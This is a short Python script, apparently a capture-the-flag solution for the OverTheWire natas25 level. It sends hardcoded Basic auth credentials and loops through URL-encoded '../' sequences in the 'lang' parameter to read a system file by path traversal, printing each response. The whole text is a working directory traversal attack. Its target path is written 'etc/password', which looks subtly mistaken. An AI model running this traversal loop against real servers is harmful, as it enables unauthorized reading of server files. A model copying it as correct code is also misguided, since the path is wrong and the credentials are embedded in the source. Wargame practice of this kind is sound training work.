import requests

headers = {
    'Authorization': 'Basic bmF0YXMyNTpHSEY2WDdZd0FDYVlZc3NIVlkwNWNGcTgzaFJrdGw0Yw=='
}

payload = 'etc/password'

for index in range(1, 15):
    traversal = '%2e%2e/' * index

    url = f"http://natas25.natas.labs.overthewire.org/?lang={traversal}{payload}"

    request = requests.get(url=url, headers=headers)

    content = request.content.decode('utf-8')

    print(content)
